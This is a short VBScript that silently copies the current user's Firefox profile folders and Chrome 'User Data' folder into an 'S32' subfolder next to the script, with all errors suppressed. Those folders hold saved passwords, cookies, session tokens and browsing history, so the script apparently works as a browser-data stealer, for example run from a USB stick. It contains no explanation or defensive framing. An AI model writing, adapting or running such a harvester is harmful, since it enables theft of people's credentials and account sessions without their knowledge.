On error resume next

Function CopyRecursiveFolder(rootFolderSpec,targetFolderSpec)
Set objFS = CreateObject("Scripting.FileSystemObject")
If Not objFS.FolderExists(targetFolderSpec) Then
objFS.CreateFolder(targetFolderSpec)
End if
Set rootFolder = objFS.GetFolder(rootFolderSpec)
Set folderFiles = rootFolder.Files
For Each folderFile in folderFiles
objFS.CopyFile objFS.BuildPath(rootFolderSpec,folderFile.name), _
objFS.BuildPath(targetFolderSpec,folderFile.name)
Next
Set subfolders = rootFolder.SubFolders
For Each subfolder in subfolders
CopyRecursiveFolder objFS.BuildPath(rootFolderSpec,subfolder.name), _
objFS.BuildPath(targetFolderSpec,subfolder.name)
Next
End Function

Set ofso = CreateObject("Scripting.FileSystemObject")
curdir = ofso.GetParentFolderName(Wscript.ScriptFullName)

Set oShell = CreateObject("WScript.Shell")
strFold = oShell.ExpandEnvironmentStrings("%APPDATA%")
CopyRecursiveFolder strFold+"\Mozilla\Firefox\Profiles", curdir+"\S32\1"

strFold = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
if ofso.FolderExists(strFold+"\Mozilla\Firefox\Profiles") then
CopyRecursiveFolder strFold+"\Mozilla\Firefox\Profiles", curdir+"\S32\11"
end if

strFold = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
if ofso.FolderExists(strFold+"\Google\Chrome\User Data\") then
CopyRecursiveFolder strFold+"\Google\Chrome\User Data\", curdir+"\S32\2"
end if

